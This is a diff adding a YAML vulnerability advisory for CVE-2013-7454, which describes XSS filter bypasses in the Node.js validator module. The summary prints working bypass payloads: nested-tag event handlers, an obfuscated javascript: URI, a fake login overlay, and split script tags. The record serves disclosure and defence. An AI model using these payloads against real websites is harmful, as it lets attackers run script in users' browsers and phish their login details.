@@ -1,0 +1,74 @@
+vulnerability_id: VCID-r65h-m8zw-wqhb
+aliases:
+  - CVE-2013-7454
+summary: |
+  Multiple XSS Filter Bypasses
+  The validator module for Node.js contains functionality meant to filter potential XSS attacks (a filter called xss). Several ways to bypass the filter were discovered. In general, because the function’s filtering is blacklist-based it is likely that other bypasses will be discovered in the future. Developers are encouraged not to use the xss filter function in this package.
+
+  ### Details:
+  Various inputs that could bypass the filter were discovered:
+
+  Improper parsing of nested tags:
+
+  ```
+  <s <onmouseover="alert(1)"> <;s onmouseover="alert(1)">This is a test</s>
+  ```
+
+  Incomplete filtering of javascript: URIs:
+
+  ```
+  <a href="javascriptJ a V a S c R iPt::alert(1)" "<s>">test</a>
+  ```
+
+  UI Redressing:
+
+  ```
+  <div style="z-index: 9999999; background-color: green; width: 100%; height: 100%">
+  <h1>You have won</h1>Please click the link and enter your login details:
+  <a href="http://example.com/">http://good.com</a>
+  </div>
+  ```
+
+  Bypass via Nested Forbidden Strings:
+
+  ```
+  <scrRedirecRedirect 302t 302ipt type="text/javascript">prompt(1);</scrRedirecRedirect 302t 302ipt>
+  ```
+
+  Additional bypasses were discovered by Krzysztof Kotowicz in 2012 when auditing CodeIgniter's XSS filtering function, which this code was based off of.
+severities:
+  - score: '6.5'
+    scoring_system: cvssv3
+    scoring_elements:
+    published_at:
+    reference:
+      url: http://blog.kotowicz.net/2012/07/codeigniter-210-xssclean-cross-site.html)
+      reference_type:
+      reference_id:
+  - score: '6.5'
+    scoring_system: cvssv3
+    scoring_elements:
+    published_at:
+    reference:
+      url: https://nealpoole.com/blog/2013/07/xss-filter-bypass-in-validator-nodejs-module/)
+      reference_type:
+      reference_id:
+  - score: '6.5'
+    scoring_system: cvssv3
+    scoring_elements:
+    published_at:
+    reference:
+      url: https://github.com/nodejs/security-wg/blob/main/vuln/npm/41.json
+      reference_type:
+      reference_id: 41
+weaknesses: []
+references:
+  - url: http://blog.kotowicz.net/2012/07/codeigniter-210-xssclean-cross-site.html)
+    reference_type:
+    reference_id:
+  - url: https://nealpoole.com/blog/2013/07/xss-filter-bypass-in-validator-nodejs-module/)
+    reference_type:
+    reference_id:
+  - url: https://github.com/nodejs/security-wg/blob/main/vuln/npm/41.json
+    reference_type:
+    reference_id: 41
